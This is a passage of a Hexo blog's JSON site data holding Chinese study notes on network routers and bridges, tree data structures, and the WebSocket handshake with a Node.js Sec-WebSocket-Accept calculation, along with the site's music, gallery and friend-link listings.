</script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":"<h1 id=\"路由器\"><a href=\"#路由器\" class=\"headerlink\" title=\"路由器\"></a>路由器</h1><p>路由器在网络层。</p>\n<p>路由器中的储存器里有一张路由表，里面存储着很多节点之间的最佳路由方案。但网络环境很复杂，有时还是需要动态路由。</p>\n<h1 id=\"桥接器\"><a href=\"#桥接器\" class=\"headerlink\" title=\"桥接器\"></a>桥接器</h1><p>桥接器在在数据链路层。</p>\n<p>交换机就是多端口桥接器。</p>\n<p>桥接器在功能上与<a href=\"https://zh.wikipedia.org/wiki/集线器\" target=\"_blank\" rel=\"noopener\">集线器</a>等其他用于连接网段的设备类似，不过后者工作在<a href=\"https://zh.wikipedia.org/wiki/物理层\" target=\"_blank\" rel=\"noopener\">物理层</a>（OSI模型第1层）。</p>\n<ul>\n<li>网桥能够识别数据链路层中的数据帧，并将这些数据帧临时存储于内存，再重新生成信号作为一个全新的数据帧转发给相连的另一个网段（network segment）。由于能够对数据帧拆包、暂存、重新打包（称为存储转发机制 store-and-forward），网桥能够连接不同技术参数传输速率的数据链路，如连接10BASE-T与100BASE-TX。</li>\n<li>数据帧中有一个位叫做FCS，用来通过<a href=\"https://zh.wikipedia.org/wiki/CRC32\" target=\"_blank\" rel=\"noopener\">CRC</a>方式校验数据帧中的位。网桥可以检查FCS，将那些损坏的数据帧丢弃。</li>\n<li>网桥在向其他网段转发数据帧时会做冲突检测控制。</li>\n<li>网桥还能通过地址自学机制和过滤功能控制网络流量，具有OSI第2层<a href=\"https://zh.wikipedia.org/wiki/网络交换机\" target=\"_blank\" rel=\"noopener\">网络交换机</a>功能。这称为transparent bridge，由<a href=\"https://zh.wikipedia.org/wiki/DEC\" target=\"_blank\" rel=\"noopener\">DEC</a>在1980年代发明<a href=\"https://zh.wikipedia.org/wiki/橋接器#cite_note-4\" target=\"_blank\" rel=\"noopener\">[4]</a>。其机制是网桥内部有一个数据库，最初没有数据。当网桥从一个网段收到一个数据帧，就会在数据库中登记（或者更新）数据帧的源地址属于这个网段，并检查数据包的目的地址。如果目的地址在数据库中属于另外一个网段，则网桥向该网段转发该数据帧；如果目的地址在数据库中没有记录，则网桥向除了源地址所在之外的其他所有网段转发（flood）该数据帧。</li>\n<li>桥接器仅仅在不同网络之间有数据传输的时候才将数据转发到其他网络，不是像集线器那样对所有数据都进行广播。对于<a href=\"https://zh.wikipedia.org/wiki/以太网\" target=\"_blank\" rel=\"noopener\">以太网</a>，“桥接”这一术语正式的含义是指符合<a href=\"https://zh.wikipedia.org/wiki/IEEE_802.1D\" target=\"_blank\" rel=\"noopener\">IEEE 802.1D</a>标准的设备，即“网络切换”。桥接器可以分割网段，不似集线器仍是在为同一<a href=\"https://zh.wikipedia.org/w/index.php?title=碰撞域&action=edit&redlink=1\" target=\"_blank\" rel=\"noopener\">碰撞域</a>，所以对带宽耗损较大。因桥接器透过其内之MAC表格，让发送帧不会通过，所以其称之为数据链接层操作之网络组件，可隔离碰撞。</li>\n</ul>\n<p>若有通信频繁的机器，则应置于同区之内，否则性能将降低。</p>\n"},{"layout":"post","title":"树和二叉树","date":"2020-11-23T16:00:00.000Z","description":"应付数据结构课","typora-copy-images-to":"..\\img","typora-root-url":"..","_content":"\n\n# 树和二叉树\n\n逻辑定义：\n\n1.有且仅有一个特殊的节点：根节点。\n\n2.除了根节点可以分成若干组互不交集的子集，每一个子集都是一棵树。\n\n3.根没有前驱，叶子节点没有后继。","source":"_posts/2020-11-24-树和二叉树.md","raw":"---\nlayout: post\ntitle: 树和二叉树\ndate: 2020-11-24\ncategories: blog\ntags: [编程，数据结构]\ndescription: 应付数据结构课\ntypora-copy-images-to: ..\\img\ntypora-root-url: ..\n---\n\n\n# 树和二叉树\n\n逻辑定义：\n\n1.有且仅有一个特殊的节点：根节点。\n\n2.除了根节点可以分成若干组互不交集的子集，每一个子集都是一棵树。\n\n3.根没有前驱，叶子节点没有后继。","slug":"2020-11-24-树和二叉树","published":1,"updated":"2020-11-28T08:18:37.446Z","comments":1,"photos":[],"link":"","_id":"ckkntx9k5001pxov7gz5p3m9c","content":"<h1 id=\"树和二叉树\"><a href=\"#树和二叉树\" class=\"headerlink\" title=\"树和二叉树\"></a>树和二叉树</h1><p>逻辑定义：</p>\n<p>1.有且仅有一个特殊的节点：根节点。</p>\n<p>2.除了根节点可以分成若干组互不交集的子集，每一个子集都是一棵树。</p>\n<p>3.根没有前驱，叶子节点没有后继。</p>\n<script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":"<h1 id=\"树和二叉树\"><a href=\"#树和二叉树\" class=\"headerlink\" title=\"树和二叉树\"></a>树和二叉树</h1><p>逻辑定义：</p>\n<p>1.有且仅有一个特殊的节点：根节点。</p>\n<p>2.除了根节点可以分成若干组互不交集的子集，每一个子集都是一棵树。</p>\n<p>3.根没有前驱，叶子节点没有后继。</p>\n"},{"layout":"post","title":"WebSocket笔记","date":"2020-11-21T16:00:00.000Z","description":"笔记","typora-copy-images-to":"..\\img","typora-root-url":"..","_content":"\n# WebSocket笔记\n\n## 异步请求\n\n当浏览器向服务器发送同步请求时，**服务器处理同步请求的过程中，浏览器会处于等待的状态**，服务器处理完请求把数据响应给浏览器并覆盖浏览器内存中原有的数据，**浏览器重新加载页面并展示服务器响应的数据**。这是**同步请求**。如果这个过程比较漫长，用户会感觉界面“卡死了”。\n\n异步请求就是浏览器把请求交给**代理对象—XMLHttpRequest**（绝大多数浏览器都内置了这个对象），由代理对象向服务器发起请求，接收、解析服务器响应的数据，并把数据更新到浏览器指定的控件上。从而实现了**页面数据的局部刷新**。异步请求使浏览器**不用等待服务器处理请求，不用重新加载整个页面来展示服务器响应的数据，在异步请求发送的过程中浏览器还能进行其它的操作**。\n\n\n\n异步请求的执行流程图：\n\n\n\n![img](/img/14405984-ac876e7354969cab.jpg)\n\n大多数用户交互都是使用异步响应体验更好，但有些特殊情况比如：银行转账或数据库更新等操作，优先使用同步响应，这样更安全，其中的道理不言自明。\n\n## WebSocket特点\n\n[WebSocket](http://websocket.org/) 是一种网络通信协议。[RFC6455](https://tools.ietf.org/html/rfc6455) 定义了它的通信标准。\n\nWebSocket 是 HTML5 开始提供的一种**在单个 TCP 连接上进行全双工通讯**的协议。\n\n由于HTTP是**无连接的，且，只能由客户端发起**，在一些场景下，HTTP并不能足以完成任务，所以需要建立和使用WebSocket双全工通讯协议。\n\n它的最大特点就是，服务器可以主动向客户端推送信息，客户端也可以主动向服务器发送信息，是真正的双向平等对话，属于[服务器推送技术](https://en.wikipedia.org/wiki/Push_technology)的一种。\n\n其他特点包括：\n\n（1）建立在 TCP 协议之上，服务器端的实现比较容易。\n\n（2）与 HTTP 协议有着良好的兼容性。默认端口也是80和443，并且握手阶段采用 HTTP 协议，因此握手时不容易屏蔽，能通过各种 HTTP 代理服务器。\n\n（3）数据格式比较轻量，性能开销小，通信高效。\n\n（4）可以发送文本，也可以发送二进制数据。\n\n（5）没有同源限制，客户端可以与任意服务器通信。\n\n（6）协议标识符是`ws`（如果加密，则为`wss`），服务器网址就是 URL。\n\n### 如何建立连接\n\nWebSocket复用了HTTP的握手通道。\n\n具体指的是，客户端通过HTTP请求与WebSocket服务端协商升级协议。协议升级完成后，后续的数据交换则遵照WebSocket的协议。\n\n#### 1、客户端：申请协议升级\n\n首先，客户端发起协议升级请求。可以看到，采用的是标准的HTTP报文格式，且只支持`GET`方法。\n\n```http\nGET / HTTP/1.1\nHost: localhost:8080\nOrigin: http://127.0.0.1:3000\nConnection: Upgrade\nUpgrade: websocket\t\t\t\nSec-WebSocket-Version: 13\nSec-WebSocket-Key: w4v7O6xFTi36lq3RNcgctw==\n```\n\n重点请求首部意义如下：\n\n- `Connection: Upgrade`：表示要升级协议\n- `Upgrade: websocket`：表示要升级到websocket协议。\n- `Sec-WebSocket-Version: 13`：表示websocket的版本。如果服务端不支持该版本，需要返回一个`Sec-WebSocket-Version`header，里面包含服务端支持的版本号。\n- `Sec-WebSocket-Key`：与后面服务端响应首部的`Sec-WebSocket-Accept`是配套的，提供基本的防护，比如恶意的连接，或者无意的连接。\n\n> 注意，上面请求省略了部分非重点请求首部。由于是标准的HTTP请求，类似Host、Origin、Cookie等请求首部会照常发送。在握手阶段，可以通过相关请求首部进行 安全限制、权限校验等。\n\n#### 2、服务端：响应协议升级\n\n服务端返回内容如下，状态代码`101`表示协议切换。到此完成协议升级，后续的数据交互都按照新的协议来。\n\n```http\nHTTP/1.1 101 Switching Protocols\nConnection:Upgrade\nUpgrade: websocket\nSec-WebSocket-Accept: Oy4NRAQ13jhfONC7bP8dTKb4PTU=\n```\n\n> 备注：每个header都以`\\r\\n`结尾，并且最后一行加上一个额外的空行`\\r\\n`。此外，服务端回应的HTTP状态码只能在握手阶段使用。过了握手阶段后，就只能采用特定的错误码。\n\n#### 3、Sec-WebSocket-Accept的计算\n\n`Sec-WebSocket-Accept`根据客户端请求首部的`Sec-WebSocket-Key`计算出来。\n\n计算公式为：\n\n1. 将`Sec-WebSocket-Key`跟`258EAFA5-E914-47DA-95CA-C5AB0DC85B11`拼接。\n2. 通过SHA1计算出摘要，并转成base64字符串。\n\n伪代码如下：\n\n```javascript\n>toBase64( sha1( Sec-WebSocket-Key + 258EAFA5-E914-47DA-95CA-C5AB0DC85B11 )  )\n```\n\n验证下前面的返回结果：\n\n```javascript\nconst crypto = require('crypto');\nconst magic = '258EAFA5-E914-47DA-95CA-C5AB0DC85B11';\nconst secWebSocketKey = 'w4v7O6xFTi36lq3RNcgctw==';\n\nlet secWebSocketAccept = crypto.createHash('sha1')\n\t.update(secWebSocketKey + magic)\n\t.digest('base64');\n\nconsole.log(secWebSocketAccept);\n// Oy4NRAQ13jhfONC7bP8dTKb4PTU=\n```","source":"_posts/2020-11-22-WebSocket.md","raw":"---\nlayout: post\ntitle: WebSocket笔记\ndate: 2020-11-22\ncategories: blog\ntags: [web,计算机网络]\ndescription: 笔记\ntypora-copy-images-to: ..\\img\ntypora-root-url: ..\n---\n\n# WebSocket笔记\n\n## 异步请求\n\n当浏览器向服务器发送同步请求时，**服务器处理同步请求的过程中，浏览器会处于等待的状态**，服务器处理完请求把数据响应给浏览器并覆盖浏览器内存中原有的数据，**浏览器重新加载页面并展示服务器响应的数据**。这是**同步请求**。如果这个过程比较漫长，用户会感觉界面“卡死了”。\n\n异步请求就是浏览器把请求交给**代理对象—XMLHttpRequest**（绝大多数浏览器都内置了这个对象），由代理对象向服务器发起请求，接收、解析服务器响应的数据，并把数据更新到浏览器指定的控件上。从而实现了**页面数据的局部刷新**。异步请求使浏览器**不用等待服务器处理请求，不用重新加载整个页面来展示服务器响应的数据，在异步请求发送的过程中浏览器还能进行其它的操作**。\n\n\n\n异步请求的执行流程图：\n\n\n\n![img](/img/14405984-ac876e7354969cab.jpg)\n\n大多数用户交互都是使用异步响应体验更好，但有些特殊情况比如：银行转账或数据库更新等操作，优先使用同步响应，这样更安全，其中的道理不言自明。\n\n## WebSocket特点\n\n[WebSocket](http://websocket.org/) 是一种网络通信协议。[RFC6455](https://tools.ietf.org/html/rfc6455) 定义了它的通信标准。\n\nWebSocket 是 HTML5 开始提供的一种**在单个 TCP 连接上进行全双工通讯**的协议。\n\n由于HTTP是**无连接的，且，只能由客户端发起**，在一些场景下，HTTP并不能足以完成任务，所以需要建立和使用WebSocket双全工通讯协议。\n\n它的最大特点就是，服务器可以主动向客户端推送信息，客户端也可以主动向服务器发送信息，是真正的双向平等对话，属于[服务器推送技术](https://en.wikipedia.org/wiki/Push_technology)的一种。\n\n其他特点包括：\n\n（1）建立在 TCP 协议之上，服务器端的实现比较容易。\n\n（2）与 HTTP 协议有着良好的兼容性。默认端口也是80和443，并且握手阶段采用 HTTP 协议，因此握手时不容易屏蔽，能通过各种 HTTP 代理服务器。\n\n（3）数据格式比较轻量，性能开销小，通信高效。\n\n（4）可以发送文本，也可以发送二进制数据。\n\n（5）没有同源限制，客户端可以与任意服务器通信。\n\n（6）协议标识符是`ws`（如果加密，则为`wss`），服务器网址就是 URL。\n\n### 如何建立连接\n\nWebSocket复用了HTTP的握手通道。\n\n具体指的是，客户端通过HTTP请求与WebSocket服务端协商升级协议。协议升级完成后，后续的数据交换则遵照WebSocket的协议。\n\n#### 1、客户端：申请协议升级\n\n首先，客户端发起协议升级请求。可以看到，采用的是标准的HTTP报文格式，且只支持`GET`方法。\n\n```http\nGET / HTTP/1.1\nHost: localhost:8080\nOrigin: http://127.0.0.1:3000\nConnection: Upgrade\nUpgrade: websocket\t\t\t\nSec-WebSocket-Version: 13\nSec-WebSocket-Key: w4v7O6xFTi36lq3RNcgctw==\n```\n\n重点请求首部意义如下：\n\n- `Connection: Upgrade`：表示要升级协议\n- `Upgrade: websocket`：表示要升级到websocket协议。\n- `Sec-WebSocket-Version: 13`：表示websocket的版本。如果服务端不支持该版本，需要返回一个`Sec-WebSocket-Version`header，里面包含服务端支持的版本号。\n- `Sec-WebSocket-Key`：与后面服务端响应首部的`Sec-WebSocket-Accept`是配套的，提供基本的防护，比如恶意的连接，或者无意的连接。\n\n> 注意，上面请求省略了部分非重点请求首部。由于是标准的HTTP请求，类似Host、Origin、Cookie等请求首部会照常发送。在握手阶段，可以通过相关请求首部进行 安全限制、权限校验等。\n\n#### 2、服务端：响应协议升级\n\n服务端返回内容如下，状态代码`101`表示协议切换。到此完成协议升级，后续的数据交互都按照新的协议来。\n\n```http\nHTTP/1.1 101 Switching Protocols\nConnection:Upgrade\nUpgrade: websocket\nSec-WebSocket-Accept: Oy4NRAQ13jhfONC7bP8dTKb4PTU=\n```\n\n> 备注：每个header都以`\\r\\n`结尾，并且最后一行加上一个额外的空行`\\r\\n`。此外，服务端回应的HTTP状态码只能在握手阶段使用。过了握手阶段后，就只能采用特定的错误码。\n\n#### 3、Sec-WebSocket-Accept的计算\n\n`Sec-WebSocket-Accept`根据客户端请求首部的`Sec-WebSocket-Key`计算出来。\n\n计算公式为：\n\n1. 将`Sec-WebSocket-Key`跟`258EAFA5-E914-47DA-95CA-C5AB0DC85B11`拼接。\n2. 通过SHA1计算出摘要，并转成base64字符串。\n\n伪代码如下：\n\n```javascript\n>toBase64( sha1( Sec-WebSocket-Key + 258EAFA5-E914-47DA-95CA-C5AB0DC85B11 )  )\n```\n\n验证下前面的返回结果：\n\n```javascript\nconst crypto = require('crypto');\nconst magic = '258EAFA5-E914-47DA-95CA-C5AB0DC85B11';\nconst secWebSocketKey = 'w4v7O6xFTi36lq3RNcgctw==';\n\nlet secWebSocketAccept = crypto.createHash('sha1')\n\t.update(secWebSocketKey + magic)\n\t.digest('base64');\n\nconsole.log(secWebSocketAccept);\n// Oy4NRAQ13jhfONC7bP8dTKb4PTU=\n```","slug":"2020-11-22-WebSocket","published":1,"updated":"2020-11-22T07:32:30.592Z","comments":1,"photos":[],"link":"","_id":"ckkntx9k6001sxov7j8p9er63","content":"<h1 id=\"WebSocket笔记\"><a href=\"#WebSocket笔记\" class=\"headerlink\" title=\"WebSocket笔记\"></a>WebSocket笔记</h1><h2 id=\"异步请求\"><a href=\"#异步请求\" class=\"headerlink\" title=\"异步请求\"></a>异步请求</h2><p>当浏览器向服务器发送同步请求时，<strong>服务器处理同步请求的过程中，浏览器会处于等待的状态</strong>，服务器处理完请求把数据响应给浏览器并覆盖浏览器内存中原有的数据，<strong>浏览器重新加载页面并展示服务器响应的数据</strong>。这是<strong>同步请求</strong>。如果这个过程比较漫长，用户会感觉界面“卡死了”。</p>\n<p>异步请求就是浏览器把请求交给<strong>代理对象—XMLHttpRequest</strong>（绝大多数浏览器都内置了这个对象），由代理对象向服务器发起请求，接收、解析服务器响应的数据，并把数据更新到浏览器指定的控件上。从而实现了<strong>页面数据的局部刷新</strong>。异步请求使浏览器<strong>不用等待服务器处理请求，不用重新加载整个页面来展示服务器响应的数据，在异步请求发送的过程中浏览器还能进行其它的操作</strong>。</p>\n<p>异步请求的执行流程图：</p>\n<p><img src=\"/img/14405984-ac876e7354969cab.jpg\" alt=\"img\"></p>\n<p>大多数用户交互都是使用异步响应体验更好，但有些特殊情况比如：银行转账或数据库更新等操作，优先使用同步响应，这样更安全，其中的道理不言自明。</p>\n<h2 id=\"WebSocket特点\"><a href=\"#WebSocket特点\" class=\"headerlink\" title=\"WebSocket特点\"></a>WebSocket特点</h2><p><a href=\"http://websocket.org/\" target=\"_blank\" rel=\"noopener\">WebSocket</a> 是一种网络通信协议。<a href=\"https://tools.ietf.org/html/rfc6455\" target=\"_blank\" rel=\"noopener\">RFC6455</a> 定义了它的通信标准。</p>\n<p>WebSocket 是 HTML5 开始提供的一种<strong>在单个 TCP 连接上进行全双工通讯</strong>的协议。</p>\n<p>由于HTTP是<strong>无连接的，且，只能由客户端发起</strong>，在一些场景下，HTTP并不能足以完成任务，所以需要建立和使用WebSocket双全工通讯协议。</p>\n<p>它的最大特点就是，服务器可以主动向客户端推送信息，客户端也可以主动向服务器发送信息，是真正的双向平等对话，属于<a href=\"https://en.wikipedia.org/wiki/Push_technology\" target=\"_blank\" rel=\"noopener\">服务器推送技术</a>的一种。</p>\n<p>其他特点包括：</p>\n<p>（1）建立在 TCP 协议之上，服务器端的实现比较容易。</p>\n<p>（2）与 HTTP 协议有着良好的兼容性。默认端口也是80和443，并且握手阶段采用 HTTP 协议，因此握手时不容易屏蔽，能通过各种 HTTP 代理服务器。</p>\n<p>（3）数据格式比较轻量，性能开销小，通信高效。</p>\n<p>（4）可以发送文本，也可以发送二进制数据。</p>\n<p>（5）没有同源限制，客户端可以与任意服务器通信。</p>\n<p>（6）协议标识符是<code>ws</code>（如果加密，则为<code>wss</code>），服务器网址就是 URL。</p>\n<h3 id=\"如何建立连接\"><a href=\"#如何建立连接\" class=\"headerlink\" title=\"如何建立连接\"></a>如何建立连接</h3><p>WebSocket复用了HTTP的握手通道。</p>\n<p>具体指的是，客户端通过HTTP请求与WebSocket服务端协商升级协议。协议升级完成后，后续的数据交换则遵照WebSocket的协议。</p>\n<h4 id=\"1、客户端：申请协议升级\"><a href=\"#1、客户端：申请协议升级\" class=\"headerlink\" title=\"1、客户端：申请协议升级\"></a>1、客户端：申请协议升级</h4><p>首先，客户端发起协议升级请求。可以看到，采用的是标准的HTTP报文格式，且只支持<code>GET</code>方法。</p>\n<pre class=\"line-numbers language-http\"><code class=\"language-http\">GET / HTTP/1.1\n<span class=\"token header-name keyword\">Host:</span> localhost:8080\n<span class=\"token header-name keyword\">Origin:</span> http://127.0.0.1:3000\n<span class=\"token header-name keyword\">Connection:</span> Upgrade\n<span class=\"token header-name keyword\">Upgrade:</span> websocket            \n<span class=\"token header-name keyword\">Sec-WebSocket-Version:</span> 13\n<span class=\"token header-name keyword\">Sec-WebSocket-Key:</span> w4v7O6xFTi36lq3RNcgctw==<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>重点请求首部意义如下：</p>\n<ul>\n<li><code>Connection: Upgrade</code>：表示要升级协议</li>\n<li><code>Upgrade: websocket</code>：表示要升级到websocket协议。</li>\n<li><code>Sec-WebSocket-Version: 13</code>：表示websocket的版本。如果服务端不支持该版本，需要返回一个<code>Sec-WebSocket-Version</code>header，里面包含服务端支持的版本号。</li>\n<li><code>Sec-WebSocket-Key</code>：与后面服务端响应首部的<code>Sec-WebSocket-Accept</code>是配套的，提供基本的防护，比如恶意的连接，或者无意的连接。</li>\n</ul>\n<blockquote>\n<p>注意，上面请求省略了部分非重点请求首部。由于是标准的HTTP请求，类似Host、Origin、Cookie等请求首部会照常发送。在握手阶段，可以通过相关请求首部进行 安全限制、权限校验等。</p>\n</blockquote>\n<h4 id=\"2、服务端：响应协议升级\"><a href=\"#2、服务端：响应协议升级\" class=\"headerlink\" title=\"2、服务端：响应协议升级\"></a>2、服务端：响应协议升级</h4><p>服务端返回内容如下，状态代码<code>101</code>表示协议切换。到此完成协议升级，后续的数据交互都按照新的协议来。</p>\n<pre class=\"line-numbers language-http\"><code class=\"language-http\"><span class=\"token response-status\">HTTP/1.1 <span class=\"token property\">101 Switching Protocols</span></span>\n<span class=\"token header-name keyword\">Connection:</span>Upgrade\n<span class=\"token header-name keyword\">Upgrade:</span> websocket\n<span class=\"token header-name keyword\">Sec-WebSocket-Accept:</span> Oy4NRAQ13jhfONC7bP8dTKb4PTU=<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<blockquote>\n<p>备注：每个header都以<code>\\r\\n</code>结尾，并且最后一行加上一个额外的空行<code>\\r\\n</code>。此外，服务端回应的HTTP状态码只能在握手阶段使用。过了握手阶段后，就只能采用特定的错误码。</p>\n</blockquote>\n<h4 id=\"3、Sec-WebSocket-Accept的计算\"><a href=\"#3、Sec-WebSocket-Accept的计算\" class=\"headerlink\" title=\"3、Sec-WebSocket-Accept的计算\"></a>3、Sec-WebSocket-Accept的计算</h4><p><code>Sec-WebSocket-Accept</code>根据客户端请求首部的<code>Sec-WebSocket-Key</code>计算出来。</p>\n<p>计算公式为：</p>\n<ol>\n<li>将<code>Sec-WebSocket-Key</code>跟<code>258EAFA5-E914-47DA-95CA-C5AB0DC85B11</code>拼接。</li>\n<li>通过SHA1计算出摘要，并转成base64字符串。</li>\n</ol>\n<p>伪代码如下：</p>\n<pre class=\"line-numbers language-javascript\"><code class=\"language-javascript\"><span class=\"token operator\">></span><span class=\"token function\">toBase64</span><span class=\"token punctuation\">(</span> <span class=\"token function\">sha1</span><span class=\"token punctuation\">(</span> Sec<span class=\"token operator\">-</span>WebSocket<span class=\"token operator\">-</span>Key <span class=\"token operator\">+</span> 258EAFA5<span class=\"token operator\">-</span>E914<span class=\"token operator\">-</span>47DA<span class=\"token operator\">-</span>95CA<span class=\"token operator\">-</span>C5AB0DC85B11 <span class=\"token punctuation\">)</span>  <span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>验证下前面的返回结果：</p>\n<pre class=\"line-numbers language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">const</span> crypto <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'crypto'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> magic <span class=\"token operator\">=</span> <span class=\"token string\">'258EAFA5-E914-47DA-95CA-C5AB0DC85B11'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> secWebSocketKey <span class=\"token operator\">=</span> <span class=\"token string\">'w4v7O6xFTi36lq3RNcgctw=='</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">let</span> secWebSocketAccept <span class=\"token operator\">=</span> crypto<span class=\"token punctuation\">.</span><span class=\"token function\">createHash</span><span class=\"token punctuation\">(</span><span class=\"token string\">'sha1'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">.</span><span class=\"token function\">update</span><span class=\"token punctuation\">(</span>secWebSocketKey <span class=\"token operator\">+</span> magic<span class=\"token 